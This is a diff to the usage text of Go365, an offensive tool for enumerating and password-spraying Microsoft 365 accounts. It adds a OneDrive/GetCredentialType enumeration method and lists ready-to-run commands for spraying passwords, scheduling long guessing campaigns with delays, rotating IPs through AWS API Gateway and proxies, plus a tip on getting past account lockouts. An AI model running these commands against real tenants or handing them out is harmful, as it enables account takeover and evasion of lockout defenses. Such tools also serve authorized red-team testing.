@@ -69,16 +69,19 @@ const (
                                 : Print xml response
 	  -cloud				          		: When spraying companies attached to US Tenants (https://login.microsoftonline.us/)
     -fireprox                   : Use AWS API Gateway to rotate IPs
+    -method                     : Method to use for enumeration
+                                : (-method OneDrive) or (-method GetCredentialType)
 
  Examples:
-  ./Go365 -endpoint user -ul ./user_list.txt -d pwnthisfakedomain.com -o valid_users.txt
-  ./Go365 -endpoint rst -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com
-  ./Go365 -endpoint graph -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5
-  ./Go365 -endpoint rst -up ./userpass_list.txt -delay 3600 -d pwnthisfakedomain.com -w 5 -o Go365output.txt
   ./Go365 -endpoint graph -u legituser -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -proxy 127.0.0.1:1080
-  ./Go365 -endpoint rst -u legituser -pl ./pass_list.txt -delay 1800 -d pwnthisfakedomain.com -w 5 -o Go365output.txt -proxyfile ./proxyfile.txt
+  ./Go365 -endpoint graph -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5
   ./Go365 -endpoint graph -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -url https://notrealgetyourown.execute-api.us-east-2.amazonaws.com/login 
+  ./Go365 -endpoint rst -u legituser -pl ./pass_list.txt -delay 1800 -d pwnthisfakedomain.com -w 5 -o Go365output.txt -proxyfile ./proxyfile.txt
   You can even schedule out your entire password guessing campaign using the -pl and -delay flags :)
+  ./Go365 -endpoint rst -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com
+  ./Go365 -endpoint rst -up ./userpass_list.txt -delay 3600 -d pwnthisfakedomain.com -w 5 -o Go365output.txt
+  ./Go365 -endpoint user -u legituser -d pwnthisfakedomain.com -method OneDrive
+  ./Go365 -endpoint user -ul ./user_list.txt -d pwnthisfakedomain.com -o valid_users.txt
   ./Go365 -endpoint rst -ul ./user_list.txt -d pwnthisfakedomain.com -w 5 -o Go365output.txt -url https://notrealgetyourown.execute-api.us-east-2.amazonaws.com/login -proxyfile listofprox.txt -pl listofpasswords.txt -delay 7200
   
   *Protip: If you get a lot of "Account locked out" responses, then you might wanna proxy or use an AWS Gateway.`
